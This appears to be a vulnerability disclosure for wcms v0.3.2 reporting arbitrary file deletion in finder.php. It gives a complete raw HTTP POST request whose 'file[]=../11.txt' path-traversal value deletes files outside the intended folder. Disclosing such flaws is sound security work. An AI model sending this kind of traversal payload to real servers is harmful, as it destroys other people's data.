#### BUG_AUTHOR:acmglz
# wcms has arbitrary file deletion
## Download address:
https://github.com/vedees/wcms/releases/tag/0.3.2
## Version:v0.3.2
## Tested on: PHP, Apache, MySQL
## Affected Page:
/wcms/wex/finder.php?p=

POST
```
POST /wcms/wex/finder.php?p= HTTP/1.1
Host: bc123.com
Content-Length: 45
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://bc123.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bc123.com/wcms/wex/finder.php?p=
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fr79h5nb1s5marnuvmhgi8dmu7
Connection: close

p=&group=1&file%5B%5D=../11.txt&delete=Delete
```



## Proof of vulnerability:

1. Create the 11.txt file in another directory
![image](https://github.com/user-attachments/assets/7a9747d6-4673-4de5-874f-2d495c5f4bc6)

   

2. Test arbitrary file deletion according to post data

![image](https://github.com/user-attachments/assets/c12ce9d2-46f1-47ad-9b45-3c789c9384b8)




